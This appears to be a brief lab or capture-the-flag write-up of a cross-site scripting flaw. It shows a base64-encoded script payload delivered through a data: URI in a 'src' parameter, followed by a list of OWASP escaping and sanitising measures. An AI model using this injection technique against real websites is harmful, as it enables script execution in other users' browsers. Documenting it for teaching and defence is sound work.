## XSS using code encoding

[https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

We may encode our script in base64 and place it in META tag. This way we get rid of alert() totally. More information about this method can be found in RFC 2397

### Exploit

Encode `<script>alert('xss')</script>` to base64 `PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=`

Go to `<server>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=`


### How to Prevent

* Never Insert Untrusted Data Except in Allowed Locations
* HTML Escape Before Inserting Untrusted Data into HTML Element Content
* Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes
* JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values
* HTML escape JSON values in an HTML context and read the data with JSON.parse
* CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values
* URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values
* Sanitize HTML Markup with a Library Designed for the Job
* Prevent DOM-based XSS